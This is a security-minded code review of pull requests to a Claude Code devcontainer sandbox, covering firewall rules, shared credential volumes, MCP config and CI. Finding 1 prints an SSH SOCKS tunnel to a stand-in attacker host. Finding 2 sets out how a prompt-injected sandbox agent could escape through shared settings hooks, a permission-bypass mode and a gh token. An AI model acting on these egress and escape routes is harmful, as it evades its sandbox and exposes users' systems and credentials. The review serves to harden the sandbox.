## Review Round 1

### Summary

The open PRs are careful, well tested, and mostly canonical. #238 moves the sandbox to the same
model as Anthropic's reference devcontainer: a baked firewall plus a narrow sudoers entry. #237 uses Oxc's
built-in `oxc.path.node` setting and the git-documented system scope for `safe.directory`. Three
issues matter, though:

1. The sandbox firewall #238 hardens still has an unrestricted egress path: outbound TCP/22 to any host.
2. #239 makes the sandbox share `~/.claude` and the gh and cf logins with the default variant. That turns a
   prompt-injected sandbox agent into code execution in the default variant, which has full sudo and no firewall.
3. The `patch-playwright-mcp` machinery, which #237 patches again, is hand-written config rewriting. Playwright MCP
   environment variables replace it.

Every open PR also edits the same 1.8 KB verify string in six places, so all four conflict with each other.

### Important

#### 1. The sandbox firewall allows outbound SSH to any host, which bypasses the allowlist

`claude-code/.devcontainer/init-firewall.sh` (#238), the `--dport 22` / `--sport 22` rules after "Allow DNS, SSH, and localhost"

```bash
iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
```

The OUTPUT rule has no destination match, so any host is reachable on port 22. The image ships
`openssh-client` (`Dockerfile`, apt block in `base`). A prompt-injected agent can run `ssh -D 1080 user@attacker:22` and
send all traffic through that SOCKS proxy. A plain TCP connection to port 22 from `node` or `curl` works without SSH too.
That undoes the default-deny egress that #238 exists to guarantee, whether or not the agent can touch iptables.

The sandbox doesn't need SSH egress: the template's `GIT_CONFIG_*` block rewrites `git@github.com:` to HTTPS
(`url.https://github.com/.insteadOf`), and gh does the authentication. The rules came from Anthropic's reference
script, where they're lines 32–35 of `.devcontainer/init-firewall.sh`. The hole is inherited from upstream.

**Fix:** delete both port-22 rules. If a project needs SSH to an allowlisted host, limit the rule to the ipset:
`iptables -A OUTPUT -p tcp --dport 22 -m set --match-set allowed-domains dst -j ACCEPT`. Add a CI or local check that
`timeout 5 bash -c '</dev/tcp/example.com/22'` fails. Fix the same rule in the repo's own
`.devcontainer/claude-sandbox/init-firewall.sh`.

#### 2. Sharing `~/.claude`, gh and cf with the sandbox lets the sandbox agent escape it (#239)

`claude-code/.devcontainer/claude-sandbox/docker-compose.yml` (#239, the new `volumes:`); README "Sandbox and the shared `~/.claude`"

The README says sharing `~/.claude` "adds nothing new" because both variants already share `/workspace/.claude/`. Claude
Code's docs say otherwise. The two scopes aren't equivalent:

- `permissions.defaultMode: "bypassPermissions"` "doesn't take effect from project or local settings; set
  [it] in user or managed settings" (code.claude.com/docs/en/settings, "A value you set is ignored", since v2.1.257).
  A workspace file can't turn on bypass mode in the default variant. `~/.claude/settings.json` can.
- Project `permissions.allow` rules "apply only after each teammate trusts the folder". User settings don't wait for trust.
- `/workspace/.claude/` edits show in `git diff`. `~/.claude/settings.json` edits don't. #238 relies on `git diff`
  as the mitigation for `allowed-domains.txt` edits, and #239 removes that visibility for a stronger file.
- Settings files hot-reload, including `hooks` (same page, "When edits take effect").

So a sandbox agent, which runs with prompts skipped, can write a `SessionStart` hook or `defaultMode: bypassPermissions` into
the shared `~/.claude/settings.json`. The next default-variant session runs that hook with `NOPASSWD:ALL` sudo and no
firewall. The shared `gh-config` volume also gives the sandbox the user's `gh auth login` token. Its default scopes
include `repo` and `gist`, and GitHub's ranges are on the firewall allowlist, so the token works as an exfiltration and
push channel. The README's sandbox cf guidance already advises a scoped API token instead of the shared login.

Before #239 this sharing was documented but never worked (#209), so the PR turns on a latent escape path.

**Fix (recommended):** keep the fixed-name `volumes:` approach, which is the right fix for the Compose prefixing in #209,
but give the sandbox its own names: `myproject-sandbox-claude-config`, `-gh-config`, `-cloudflare-config`. Sharing
`zsh-history` is harmless. The sandbox signs in through the path the README already documents, `CLAUDE_CODE_OAUTH_TOKEN`
from `claude setup-token`. For gh it uses a fine-grained PAT limited to the repo. The cost is one extra sign-in per
project, and the sandbox is the variant where that's worth paying. If you still want sharing, make it an opt-in block and
fix the README trust note, because the "adds nothing new" claim is wrong.

#### 3. `patch-playwright-mcp` hand-rewrites plugin config; Playwright MCP reads the same options from env vars

`claude-code/.devcontainer/patch-playwright-mcp.sh` (patched again in #237), `managed-settings.json` `hooks.SessionStart`,
both templates' `postStartCommand`, `init-plugins.sh`, three CI checks per verify string

The script `jq`-rewrites every cached `.mcp.json` of the Playwright plugin to add `--browser chromium --executable-path
/usr/bin/chromium --no-sandbox --headless`. It runs at every container start and every session start, because plugin
updates bring back the pristine file (#64, #85, #87, #98). #237 adds a guard for a fresh volume (#207).

Playwright MCP reads every CLI option from an environment variable:

- README option table: `--browser` → `PLAYWRIGHT_MCP_BROWSER`, `--executable-path` → `PLAYWRIGHT_MCP_EXECUTABLE_PATH`,
  `--headless` → `PLAYWRIGHT_MCP_HEADLESS`.
- Source `packages/playwright-core/src/tools/mcp/config.ts:430-460` reads them. `envToBoolean` (`:632`) accepts
  `true`/`1`. For the `chromium` channel on Linux, the Chromium sandbox already defaults off (`:236-240`), and an explicit
  `PLAYWRIGHT_MCP_SANDBOX=false` is read at `:460`. The README labels that variable `NO_SANDBOX`, but the source reads
  `PLAYWRIGHT_MCP_SANDBOX`.
- **Probe:** Claude Code 2.1.308 passes its whole environment to stdio MCP servers. A probe server launched through
  `--mcp-config` received 74 variables, including a `PLAYWRIGHT_MCP_EXECUTABLE_PATH` set only in the parent shell.

**Fix:** in the `shared` stage, next to `AGENT_BROWSER_EXECUTABLE_PATH`:

```dockerfile
ENV PLAYWRIGHT_MCP_BROWSER=chromium \
    PLAYWRIGHT_MCP_EXECUTABLE_PATH=/usr/bin/chromium \
    PLAYWRIGHT_MCP_HEADLESS=true
```

Then delete the script, its `COPY`, the `SessionStart` hook, the `patch-playwright-mcp` calls in both templates and
`init-plugins.sh`, the three CI assertions in each verify string, and the README/skill text about re-patching. That's
about 60 lines plus a container-start step, and #237's #207 fix becomes unnecessary. The plugin's `.mcp.json` stays as
upstream ships it, so plugin auto-updates can't regress it again. Replace the CI checks with
`printenv PLAYWRIGHT_MCP_EXECUTABLE_PATH | grep -qx /usr/bin/chromium` (the project's `printenv | grep -qx` idiom).

#### 4. The 1.8 KB verify command is copied six times, so every open PR conflicts with every other

`.github/workflows/build-claude-code.yml:80-100` (four matrix entries), `.github/workflows/ci.yml:117-131` (two `add_image` calls)

#218, #237, #238 and #239 each rewrite all six copies of a string of about 1,750 characters. They conflict pairwise, and
#239's notes already list the conflict with #238. The copies must stay identical by hand. The project memory records
that local extraction of these strings silently skipped checks, because of the `\"` escaping. `build-claude-code.yml`
also expands the string straight into the script (`bash -c "${{ matrix.verify-command }}"`). The input is static, so it
isn't exploitable, but GitHub's hardening guide advises an env var, and that inline expansion is why the escaping is
fragile. `ci.yml` already uses `env: VERIFY_CMD`.

**Fix:** move the checks into one script, `claude-code/verify-image.sh` (`case "$1" in default|sandbox)`, with shared
checks first). Both workflows run it with
`docker run --rm -v "$PWD/claude-code/verify-image.sh:/verify:ro" "$IMAGE" bash /verify sandbox`. Each future PR then
changes one line in one file, a local run is `docker run … bash /verify default`, and the escaping problem goes away.
`container-structure-test` is the off-the-shelf tool for this. Keep it in reserve: a 30-line script needs no new
dependency, and most checks here are behavioral (`jq`, `zsh -ic`, `sudo -l`), which suit a shell script better.

### Minor

#### 5. The firewall fails open: an error before the DROP policies leaves the sandbox unfirewalled

`claude-code/.devcontainer/init-firewall.sh` (#238), from `iptables -F` down to `iptables -P OUTPUT DROP`

`set -e` exits on the first error, for example when `curl -s https://api.github.com/meta` returns nothing during a
network blip, or `HOST_IP` is empty. If that happens after the flush and before the policies, the container has no rules
and an ACCEPT policy. `postStartCommand` fails, but the container is usable, and Claude Code there runs with permission
prompts skipped. Anthropic's reference has the same ordering.

**Fix:** after the "already active" check, add `trap 'iptables -P INPUT DROP; iptables -P OUTPUT DROP; iptables -P FORWARD DROP' ERR`.
A failed run then leaves the network closed (fail-closed), and the existing "already active" guard tells the user to
restart the container.

#### 6. Read the allowlist as `node` instead of hand-checking the path as root

`claude-code/.devcontainer/init-firewall.sh` (#238), the `realpath -e` block

The script resolves the path as root, checks that it's a regular file under `/workspace`, then reads it. That's three
checks to stop root reading something `node` couldn't, and the gap between check and read is a race.
`runuser` (util-linux, present at `/usr/sbin/runuser` in `node:24-trixie-slim`, checked) lets the kernel enforce it:

```bash
content=$(timeout 5 runuser -u node -- cat -- "$ALLOWLIST" 2>/dev/null || true)
while IFS= read -r line; do …; done <<< "$content"
```

A symlink to `/etc/shadow` fails with EACCES. `timeout` guards against a FIFO. The domain regex stays. The block gets
shorter and the race disappears.

#### 7. #205 fixes the path list by hand again; invert it so new files can't be missed

`.github/workflows/build-claude-code.yml:6-11`

#205 exists because #175 added two `COPY`'d files that the explicit `paths` list didn't cover. #238 adds two more `.sh`
files, which `*.sh` happens to match. GitHub's path filters support `!` negation
(docs.github.com, "Workflow syntax › onpushpull_requestpull_request_targetpathspaths-ignore"):

```yaml
paths:
  - "claude-code/.devcontainer/**"
  - "!claude-code/.devcontainer/devcontainer.json"
  - "!claude-code/.devcontainer/docker-compose.yml"
  - "!claude-code/.devcontainer/claude-sandbox/**"
```

The failure mode flips from "a change merges and is never published" to "a template edit causes one extra build". Apply
the same to `build-ralphex-fe.yml`.

#### 8. Copy actionlint and shellcheck from their official images instead of curl stages (#218)

`claude-code/.devcontainer/Dockerfile` and `ralphex-fe/Dockerfile`, the new `actionlint-download` / `shellcheck-download` stages

Both upstreams publish multi-arch images. `docker manifest inspect` lists `linux/amd64` and `linux/arm64` for
`rhysd/actionlint:1.7.12` and `koalaman/shellcheck:v0.11.0`. The binaries are at `/usr/local/bin/actionlint` and
`/bin/shellcheck` (checked by listing both images). Renovate here uses only `custom.regex` on `ARG …_VERSION`, so keep
the ARGs and move them above the first `FROM`:

```dockerfile
# renovate: datasource=github-releases depName=rhysd/actionlint
ARG ACTIONLINT_VERSION=1.7.12
# renovate: datasource=github-releases depName=koalaman/shellcheck
ARG SHELLCHECK_VERSION=0.11.0
FROM rhysd/actionlint:${ACTIONLINT_VERSION} AS actionlint
FROM koalaman/shellcheck:v${SHELLCHECK_VERSION} AS shellcheck
…
COPY --from=actionlint /usr/local/bin/actionlint /usr/local/bin/
COPY --from=shellcheck /bin/shellcheck /usr/local/bin/
```

This removes four `apk add curl`, `uname`/`sed` arch mapping, and `tar --strip-components` stages (about 34 lines across
the two Dockerfiles), and the bytes come from the publisher's registry. The `rhysd/actionlint` image also bundles
shellcheck 0.11.0. Keep the separate shellcheck source so the two versions can move independently. The 3-day soak
covers the small lag between a GitHub release and its image tag.

#### 9. New download stages pin Alpine 3.21, which reaches end of life on 2026-11-01

`claude-code/.devcontainer/Dockerfile`, `ralphex-fe/Dockerfile` (#218 adds four more `FROM alpine:3.21`)

endoflife.date lists 3.21 EOL as 2026-11-01, ten days from now, and 3.24 as current. They're download-only stages, but
`apk add curl` on an EOL release stops getting fixes. Bump every `alpine:3.21` to `alpine:3.24` in one commit. If you
adopt #8, the two new stages are gone anyway.

#### 10. Renovate auto-merges major versions unreviewed

`.github/renovate.json5` ("devcontainer tools" rule); evidence: #224 (rtk 0.52 → **1.0.0**) was opened at 02:05 and
merged by `app/renovate` at 02:09 on 2026-10-17

`minimumReleaseAge` delays a release but doesn't review it. A major release of a tool that hooks into every Claude Code
session reached `latest` with no human looking at it. That release also changed rtk's licence to include BUSL-1.1 (see
[Upgrade opportunities](#upgrade-opportunities)), which is exactly the kind of change a major bump should get a human for. Renovate's built-in fix is one rule:

```json5
{ matchUpdateTypes: ['major'], automerge: false },
```

(or `dependencyDashboardApproval: true` for majors). The soak-then-auto-merge policy for minors and patches stays as it is.

#### 11. `ralphex-fe/README.md` tool versions are stale, and #218 adds another hard-coded one

`ralphex-fe/README.md` tool table; #218 adds `| actionlint, shellcheck | 1.7.12, 0.11.0 (pinned) |`

On master the table says Bun 1.4.2, Hugo 0.166.0, Claude Code 2.1.280, RTK 0.49.0. The Dockerfile has 1.4.3, 0.168.0,
2.1.308 and 1.0.1. Renovate PRs change only the Dockerfile, which breaks the CLAUDE.md rule "a tag list or tool table
must change in the same commit as its Dockerfile". Write "pinned `ARG`, Renovate" instead of numbers, as the claude-code
README already does.

### Upgrade opportunities

I read the release notes for every version in each bumped range. Only the items below affect this repo.

- **rtk 1.0.0 changed its licence, and the major version auto-merged (#224, see #10).** The default `rtk` tarball now
  combines Apache-2.0 with BUSL-1.1 for the compression engine and ships `LICENSE-ENGINE`. v1.0.1 also publishes
  Apache-2.0-only `rtk-oss-<target>.tar.gz` builds (the assets `rtk-oss-x86_64-unknown-linux-musl.tar.gz` and
  `rtk-oss-aarch64-unknown-linux-gnu.tar.gz` exist). They contain the hook core and every command filter, without the
  engine. Both images use only `rtk init`/`rtk hook claude`, so check whether the oss build covers what you rely on. If it
  does, switching is a URL-only change in both Dockerfiles, and an MIT-licensed image avoids redistributing BUSL code.
  `rtk proxy` is now `rtk bypass`; the old name remains as an alias.
  Nothing else in 0.51 → 1.0.1 breaks the repo: `rtk init` flags, hook command, telemetry env var and asset names are
  unchanged (rtk v1.0.0/v0.52.0 release notes).
- **cf beta.15 adds `CLOUDFLARE_DEPENDENCIES_INSTRUMENTATION=false`**, which keeps npm dependency metadata out of
  deploys. It is optional and could go next to `CF_SEND_TELEMETRY`/`WRANGLER_SEND_METRICS`, which are still correct as
  of beta.18. beta.15 also makes destructive non-TTY commands without `--force` exit 1. That fits the managed
  `ask` rule on `Bash(cf * --force*)`. #212 (`cf workers` needs miniflare/workerd) is still unfixed through beta.20, so
  #237's README narrowing is right. Upstream issue: cloudflare/cf#390.
- **Claude Code 2.1.294 → 2.1.308:** nothing breaks `managed-settings.json`. 2.1.302 fixes `claude plugin` subcommands
  exiting before their settings write finished, and 2.1.295 adds warnings when the settings file doesn't load. Both make
  `init-plugins.sh` more reliable with no change needed. 2.1.304 stops counting SessionStart hook time toward the VS Code
  start-up limit; that becomes moot if #3 removes the hook.
- **agent-browser 0.39.x, gh-stack 0.2.1, docker CLI 29.9.x, Go 1.27.3, Bun 1.4.3, Hugo 0.168, Node 24.22:** schemas
  and flags this repo uses are unchanged, and the security fixes are delivered by the bump itself. Nothing to adopt.

**Correction to #237's wording:** Hugo didn't start filtering env in 0.166. Its git calls go through the exec helper,
which passes only variables matching `security.exec.osEnv`. That default (`config/security/securityConfig.go:51`) has no
`GIT_*` pattern and is the same in 0.165, 0.166 and 0.168. The fix is right, but the Dockerfile comment and README
("Hugo >= 0.166", "Hugo 0.166 and later") should say "Hugo, whose `security.exec.osEnv` drops `GIT_CONFIG_*`".
